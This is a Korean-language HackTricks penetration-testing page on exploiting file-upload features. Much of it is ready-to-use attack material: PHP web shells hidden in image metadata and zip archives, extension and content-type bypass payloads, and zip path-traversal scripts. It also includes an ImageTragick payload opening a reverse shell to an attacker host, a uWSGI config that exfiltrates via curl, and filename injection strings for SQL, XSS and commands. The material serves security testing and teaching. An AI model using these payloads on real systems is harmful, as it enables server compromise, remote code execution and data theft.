# 파일 업로드

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅까지 AWS 해킹 배우기**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [telegram 그룹](https://t.me/peass)에 **가입**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)을 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **채용 중**! (_유창한 폴란드어 필수_).

{% embed url="https://www.stmcyber.com/careers" %}

## 파일 업로드 일반 방법론

다른 유용한 확장자:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **PHPv8에서 작동**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws 웹 서버**: _.yaws_

### 파일 확장자 확인 우회

1. 적용되는 경우 **이전 확장자를 확인**하십시오. 일부 **대문자를 사용하여** 테스트하십시오: _pHp, .pHP5, .PhAr ..._
2. _실행 확장자 앞에 **유효한 확장자를 추가**하는지 확인하십시오 (이전 확장자도 사용):_
* _file.png.php_
* _file.png.Php5_
3. 끝에 **특수 문자를 추가**해보세요. Burp를 사용하여 모든 **ascii** 및 **Unicode** 문자를 **브루트포스**할 수 있습니다. (_이전 확장자를 사용하여 준비된 페이로드를 사용할 수도 있습니다_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. 서버 측 **확장자 파서를 속이는** 방어 우회 시도. **확장자를 두 번** 또는 **확장자 사이에 쓰레기 데이터**( **null** 바이트)를 **더하는** 기술을 사용할 수 있습니다. (_이전 확장자를 사용하여 더 나은 페이로드를 준비할 수도 있습니다_)
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. 이전 확인에 **다른 확장자 계층을 추가**하십시오:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. **유효한 확장자 앞에 실행 확장자를** 놓고 서버가 잘못 구성되었는지 확인하십시오. (확장자가 **.php로 끝나지 않더라도** 모든 것이 **.php로 실행**되는 Apache 구성 오류를 이용하는 데 유용):
* _예: file.php.png_
7. **Windows**의 **NTFS 대체 데이터 스트림 (ADS)** 사용. 이 경우 금지된 확장자 뒤에 콜론 문자 ":"가 삽입되고 허용된 확장자 앞에 삽입됩니다. 결과적으로 금지된 확장자의 **빈 파일**이 서버에 생성됩니다 (예: "file.asax:.jpg"). 이 파일은 나줴 이름을 사용하여 나줴 편집할 수 있습니다. "**::$data**" 패턴을 사용하여 비어 있지 않은 파일을 만들 수도 있습니다. 따라서 이 패턴 뒤에 점 문자를 추가하여 추가 제한을 우회하는 데 유용할 수도 있습니다 (예: "file.asp::$data.")
8. 파일 이름 제한을 깨보세요. 유효한 확장자가 잘립니다. 악의적인 PHP가 남습니다. AAA<--SNIP-->AAA.php

```
# Linux 최대 255바이트
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # 여기서 4를 뺀 후 .png 추가
# 파일을 업로드하고 응답을 확인하여 허용되는 문자 수를 확인합니다. 예를 들어 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 페이로드 만들기
AAA<--SNIP 232 A-->AAA.php.png
```
### Content-Type, Magic Number, Compression & Resizing 우회

* **Content-Type** 체크 우회는 **Content-Type** **헤더**의 **값**을 다음으로 설정하여 가능합니다: _image/png_, _text/plain_, _application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* **매직 넘버** 체크 우회는 **실제 이미지의 바이트**를 파일의 시작에 추가함으로써 가능합니다 (_file_ 명령을 혼란스럽게 함). 또는 **메타데이터** 안에 **쉘을 도입**할 수 있습니다:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
또는 이미지에 **페이로드를 직접 도입**할 수도 있습니다:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* 이미지에 **압축이 추가**되는 경우, 예를 들어 [PHP-GD](https://www.php.net/manual/fr/book.image.php)와 같은 일반적인 PHP 라이브러리를 사용하여, 이전 기술은 유용하지 않을 수 있습니다. 그러나 **PLTE 청크**를 사용하여 [**여기에서 정의된 기술**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)로 압축을 **생존시킬 수 있는** 텍스트를 삽입할 수 있습니다.
* [**코드가 있는 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* 웹 페이지가 **이미지를 조정**하는 경우, 예를 들어 PHP-GD 함수 `imagecopyresized` 또는 `imagecopyresampled`를 사용하는 경우, **IDAT 청크**를 사용하여 [**여기에서 정의된 기술**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)로 압축을 **생존시킬 수 있는** 텍스트를 삽입할 수 있습니다.
* [**코드가 있는 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* **이미지 조정을 생존하는 페이로드**를 만들기 위한 다른 기술로 PHP-GD 함수 `thumbnailImage`를 사용할 수 있습니다. 그러나 **tEXt 청크**를 사용하여 [**여기에서 정의된 기술**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)로 압축을 **생존시킬 수 있는** 텍스트를 삽입할 수 있습니다.
* [**코드가 있는 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### 기타 확인할 트릭

* 이미 업로드된 파일의 이름을 **바꾸는 취약점**을 찾아보세요 (확장자 변경).
* 백도어를 실행하기 위한 **로컬 파일 포함** 취약점을 찾아보세요.
* **가능한 정보 누출**:
1. **동일한 이름**의 **동일한 파일**을 **여러 번** (동시에) 업로드합니다.
2. 이미 존재하는 **파일** 또는 **폴더**의 **이름**을 가진 파일을 업로드합니다.
3. 이름으로 **“.”, “..”, 또는 “…”**을 가진 파일을 업로드합니다. 예를 들어, Apache의 **Windows**에서, 애플리케이션이 업로드된 파일을 “/www/uploads/” 디렉토리에 저장하는 경우, “.” 파일 이름은 “/www/” 디렉토리에 “uploads”라는 파일을 생성합니다.
4. **NTFS**에서 **“…:.jpg”**와 같이 쉽게 삭제되지 않을 수 있는 파일을 업로드합니다. (Windows)
5. 이름에 `|<>*?”`와 같은 **유효하지 않은 문자**가 포함된 파일을 **Windows**에 업로드합니다. (Windows)
6. CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 및 LPT9와 같이 **예약된** (**금지된**) **이름**을 사용하여 **Windows**에 파일을 업로드합니다.
* **실행 가능한** (.exe) 또는 **.html** (의심이 적음)을 업로드하여 피해자가 실수로 열 때 **코드를 실행**하도록 시도하세요.

### 특별한 확장자 트릭

**PHP 서버**에 파일을 업로드하려는 경우, [**.htaccess** 트릭을 사용하여 코드를 실행하는 방법](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess)을 확인하세요.\
**ASP 서버**에 파일을 업로드하려는 경우, [**.config** 트릭을 사용하여 코드를 실행하는 방법](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files)을 확인하세요.

`.phar` 파일은 java의 `.jar`와 유사하지만 php용이며, php로 실행하거나 스크립트 내에서 포함하여 **사용할 수 있습니다**.

`.inc` 확장자는 종종 파일을 **가져오기 위해 사용되는 php 파일**에 사용되므로, 언젠가 **이 확장자가 실행되도록 허용**할 수 있습니다.

## **Jetty RCE**

Jetty 서버에 XML 파일을 업로드할 수 있다면 [**새로운 \*.xml 및 \*.war가 자동으로 처리**되므로 RCE를 얻을 수 있습니다](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** 따라서 다음 이미지에 나와 있는 것처럼 XML 파일을 `$JETTY_BASE/webapps/`에 업로드하고 쉘을 기대하세요!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

이 취약점에 대한 자세한 탐구를 위해 원본 연구를 확인하세요: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

원격 명령 실행 (RCE) 취약점은 uWSGI 서버에서 `.ini` 구성 파일을 수정할 수 있는 경우에만 악용할 수 있습니다. uWSGI 구성 파일은 "매직" 변수, 자리 표시자 및 연산자를 통합하기 위해 특정 구문을 활용합니다. 특히 '@' 연산자인 `@(filename)`는 파일의 내용을 포함하기 위해 설계되었습니다. uWSGI에서 지원하는 다양한 스키마 중에서 "exec" 스키마는 특히 강력하며, 프로세스의 표준 출력에서 데이터를 읽을 수 있습니다. 이 기능은 `.ini` 구성 파일이 처리될 때 원격 명령 실행 또는 임의 파일 쓰기/읽기와 같은 악의적인 목적으로 조작될 수 있습니다.

다음은 다양한 스키마를 보여주는 해로운 `uwsgi.ini` 파일의 예시입니다:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
페이로드의 실행은 구성 파일을 구문 분석하는 동안 발생합니다. 구성이 활성화되고 구문 분석되려면 uWSGI 프로세스를 다시 시작해야 합니다(충돌 후 또는 서비스 거부 공격으로 인한 재시작) 또는 파일을 자동으로 다시로드해야 합니다. 자동 다시로드 기능이 활성화된 경우 변경 사항을 감지하면 지정된 간격으로 파일을 다시로드합니다.

uWSGI의 구성 파일 구문 분석의 관대한 성격을 이해하는 것이 중요합니다. 특히, 논의된 페이로드는 바이너리 파일(예: 이미지 또는 PDF)에 삽입될 수 있으며 잠재적인 악용 범위를 더 확대할 수 있습니다.

## **wget 파일 업로드/SSRF 트릭**

일부 경우에는 서버가 **`wget`**를 사용하여 **파일을 다운로드**하고 **URL**을 **지정**할 수 있다는 것을 발견할 수 있습니다. 이러한 경우, 코드는 다운로드된 파일의 확장자가 화이트리스트 내에 있는지 확인하여 허용된 파일만 다운로드되도록 보장할 수 있습니다. 그러나 **이 확인을 우회할 수 있습니다.**\
**리눅스**에서 **파일 이름**의 **최대** 길이는 **255**이지만 **wget**는 파일 이름을 **236**자로 줄입니다. "A"\*232+".php"+".gif"라는 이름의 파일을 다운로드할 수 있습니다. 이 파일 이름은 **확인을 우회**할 것입니다(이 예에서 **".gif"**는 **유효한** 확장자입니다) 그러나 `wget`는 파일을 **"A"\*232+".php"**로 **이름을 바꿀 것**입니다.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
**다른 옵션**으로 이 체크를 우회할 수 있는 방법은 **HTTP 서버가 다른 파일로 리디렉션하도록** 만드는 것입니다. 따라서 초기 URL은 체크를 우회할 것이지만 wget은 새 이름으로 리디렉트된 파일을 다운로드할 것입니다. 이 방법은 **wget이 `--trust-server-names` 매개변수와 함께 사용되지 않는 한 작동하지 않을 것**입니다. 왜냐하면 **wget은 리디렉트된 페이지를 초기 URL에 표시된 파일 이름으로 다운로드할 것**이기 때문입니다.

## 도구

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass)는 파일 업로드 메커니즘을 테스트하는 데 도움이 되는 강력한 도구로, 버그 헌터와 펜테스터들을 지원하기 위해 설계되었습니다. 다양한 버그 바운티 기술을 활용하여 취약점을 식별하고 악용하는 프로세스를 간소화하여 웹 애플리케이션의 철저한 평가를 보장합니다.

## 파일 업로드에서 다른 취약점으로

* **파일 이름**을 `../../../tmp/lol.png`로 설정하고 **경로 순회**를 시도해보세요.
* **파일 이름**을 `sleep(10)-- -.jpg`로 설정하면 **SQL 인젝션**을 달성할 수 있습니다.
* **파일 이름**을 `<svg onload=alert(document.domain)>`로 설정하여 XSS를 달성하세요.
* **파일 이름**을 `; sleep 10;`로 설정하여 명령 인젝션을 테스트하세요(더 많은 [명령 인젝션 트릭은 여기에서 확인하세요](../command-injection.md)).
* [이미지(svg) 파일 업로드에서의 **XSS**](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** 파일 **업로드** + **XSS** = [**서비스 워커** 악용](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [svg 업로드에서의 **XXE**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* svg 파일 업로드를 통한 [**오픈 리다이렉트**](../open-redirect.md#open-redirect-uploading-svg-files)
* [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)에서 **다양한 svg 페이로드** 시도해보세요.
* 유명한 **ImageTrick** 취약점(https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* 웹 서버에 이미지를 가져오도록 지시할 수 있다면 [SSRF](../ssrf-server-side-request-forgery/)를 악용해볼 수 있습니다. 이 **이미지**가 **공개** 사이트에 **저장**될 경우, [https://iplogger.org/invisible/](https://iplogger.org/invisible/)의 URL을 지정하여 **모든 방문자의 정보를 탈취**할 수도 있습니다.
* [PDF-Adobe 업로드로 **XXE** 및 **CORS** 우회](pdf-upload-xxe-and-cors-bypass.md)
* 특별히 제작된 PDF를 통한 XSS: [다음 페이지에서는 **PDF 데이터를 삽입하여 JS 실행을 얻는 방법**](../xss-cross-site-scripting/pdf-injection.md)을 제시합니다. PDF를 업로드할 수 있다면 주어진 지침을 따라 임의의 JS를 실행할 수 있는 PDF를 준비할 수 있습니다.
* \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) 콘텐츠를 업로드하여 서버에 **안티바이러스**가 있는지 확인하세요.
* 파일 업로드 시 **크기 제한**이 있는지 확인하세요.

여기 [여기](https://twitter.com/SalahHasoneh1/status/1281274120395685889)에서 업로드를 통해 달성할 수 있는 상위 10가지 목록이 있습니다:

1. **ASP / ASPX / PHP5 / PHP / PHP3**: 웹쉘 / RCE
2. **SVG**: 저장된 XSS / SSRF / XXE
3. **GIF**: 저장된 XSS / SSRF
4. **CSV**: CSV 인젝션
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML 인젝션 / XSS / 오픈 리다이렉트
8. **PNG / JPEG**: 픽셀 플러드 공격 (DoS)
9. **ZIP**: LFI를 통한 RCE / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp 확장 프로그램

{% embed url="https://github.com/portswigger/upload-scanner" %}

## 매직 헤더 바이트

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

다른 파일 유형에 대한 정보는 [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures)를 참조하세요.

### Zip/Tar 파일 자동 압축 해제 업로드

서버 내에서 압축 해제될 ZIP 파일을 업로드할 수 있다면 2가지 작업을 수행할 수 있습니다:

#### 심볼릭 링크

다른 파일에 대한 소프트 링크를 포함하는 링크를 업로드한 후, 압축 해제된 파일에 액세스하여 연결된 파일에 액세스할 수 있습니다:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 다른 폴더에서 압축 해제

압축 해제 중 디렉토리에 파일이 예상치 못하게 생성되는 것은 중요한 문제입니다. 악의적 파일 업로드를 통한 OS 수준 명령 실행을 방지할 수 있을 것으로 초기에 가정했지만, ZIP 아카이브 형식의 계층적 압축 지원 및 디렉토리 이동 기능을 악용할 수 있습니다. 이를 통해 공격자는 대상 응용 프로그램의 압축 해제 기능을 조작하여 제한을 우회하고 안전한 업로드 디렉토리를 탈출할 수 있습니다.

이러한 파일을 작성하기 위한 자동화된 악용은 [**GitHub의 evilarc**](https://github.com/ptoomey3/evilarc)에서 사용할 수 있습니다. 이 유틸리티는 다음과 같이 사용할 수 있습니다:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
또한 **evilarc와 심볼릭 링크 트릭**이 옵션으로 사용될 수 있습니다. `/flag.txt`와 같은 파일을 대상으로 하는 경우 시스템에 해당 파일에 대한 심볼릭 링크를 만들어야 합니다. 이렇게 하면 evilarc가 작동 중에 오류를 만나지 않도록 할 수 있습니다.

아래는 악의적인 zip 파일을 만드는 데 사용되는 Python 코드의 예시입니다:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**파일 스프레이를 위한 압축 악용**

자세한 내용은 **원본 게시물을 확인하세요**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1. **PHP 쉘 생성**: PHP 코드를 작성하여 `$_REQUEST` 변수를 통해 전달된 명령을 실행합니다.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. **파일 스프레이 및 압축 파일 생성**: 여러 파일을 생성하고 이러한 파일을 포함하는 zip 아카이브가 조립됩니다.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3. **Hex 편집기 또는 vi를 사용한 수정**: vi 또는 hex 편집기를 사용하여 zip 내부 파일의 이름을 변경하여 "xxA"를 "../"로 변경하여 디렉토리를 탐색합니다.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

이 내용을 이미지 확장자로 업로드하여 취약점을 악용합니다 **(ImageMagick, 7.0.1-1)** ([exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG에 PHP 셸 임베딩

PNG 파일의 IDAT 청크에 PHP 셸을 임베딩하면 특정 이미지 처리 작업을 우회할 수 있습니다. PHP-GD의 `imagecopyresized` 및 `imagecopyresampled` 함수는 이미지 크기 조정 및 재샘플링에 일반적으로 사용되므로 이러한 작업과 관련이 깊습니다. 임베딩된 PHP 셸이 이러한 작업에 영향을 받지 않고 유지되는 능력은 특정 사용 사례에 대한 중요한 장점입니다.

이 기술에 대한 자세한 탐구는 다음 기사에서 제공됩니다: ["PNG IDAT 청크에 웹 셸 인코딩하기"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). 이 자료는 이 프로세스와 그 영향에 대한 포괄적인 이해를 제공합니다.

더 많은 정보: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot 파일

Polyglot 파일은 사이버 보안에서 독특한 도구로 작용하여 여러 파일 형식에서 동시에 유효하게 존재할 수 있는 카멜레온으로 작용합니다. 흥미로운 예로 [GIFAR](https://en.wikipedia.org/wiki/Gifar)가 있으며 GIF 및 RAR 아카이브로 모두 작동합니다. 이러한 파일은 이러한 조합에 제한되지 않으며, GIF 및 JS 또는 PPT 및 JS와 같은 조합도 가능합니다.

Polyglot 파일의 핵심 유틸리티는 파일 유형에 기반한 보안 조치를 우회할 수 있는 능력에 있습니다. 다양한 응용 프로그램에서의 일반적인 실천은 잠재적으로 유해한 형식(JS, PHP 또는 Phar 파일 등)에 대한 위험을 완화하기 위해 JPEG, GIF 또는 DOC와 같은 특정 파일 유형만 업로드 허용하는 것입니다. 그러나 다중 파일 유형의 구조적 기준을 준수함으로써 Polyglot은 이러한 제한을 은밀하게 우회할 수 있습니다.

적응성이 있지만 Polyglot은 제한을 만날 수 있습니다. 예를 들어, Polyglot이 PHAR 파일(PHp ARchive)과 JPEG를 동시에 나타낼 수 있더라도 업로드의 성공은 플랫폼의 파일 확장자 정책에 달려 있을 수 있습니다. 시스템이 허용 가능한 확장자에 엄격하게 관리하는 경우, Polyglot의 단순한 구조적 이중성만으로는 업로드를 보장할 수 없을 수 있습니다.

더 많은 정보: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## 참고 자료

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **저희가 채용 중입니다!** (_유창한 폴란드어 필수_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>제로부터 AWS 해킹을 전문가로 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>와 함께!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에 광고하거나 PDF로 다운로드하려면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* 여러분의 해킹 기술을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
